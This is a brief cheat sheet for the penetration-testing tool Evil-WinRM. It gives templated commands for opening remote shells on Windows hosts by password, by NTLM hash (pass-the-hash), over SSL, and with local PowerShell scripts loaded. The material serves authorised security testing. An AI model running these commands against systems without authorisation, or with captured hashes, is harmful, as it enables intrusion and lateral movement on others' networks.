# Evil-WinRM

<div class="ol-section-kicker"><span>TOOL</span><strong>EVIL-WINRM</strong></div>

## Password authentication
```bash
evil-winrm -i <TARGET> -u '<USER>' -p '<PASSWORD>'
```
**Tool:** Evil-WinRM · **Platform:** Linux/macOS · **Tags:** WinRM, Authentication · **Context:** Valid user

## NTLM hash authentication
```bash
evil-winrm -i <TARGET> -u '<USER>' -H '<NT_HASH>'
```
**Tool:** Evil-WinRM · **Platform:** Linux/macOS · **Tags:** WinRM, NTLM · **Context:** Valid user

## SSL WinRM
```bash
evil-winrm -i <TARGET> -u '<USER>' -p '<PASSWORD>' -S
```
**Tool:** Evil-WinRM · **Platform:** Linux/macOS · **Tags:** WinRM, HTTPS · **Context:** Valid user

## Load local PowerShell scripts
```bash
evil-winrm -i <TARGET> -u '<USER>' -p '<PASSWORD>' -s ./scripts
```
**Tool:** Evil-WinRM · **Platform:** Linux/macOS · **Tags:** WinRM, Scripts · **Context:** Valid user
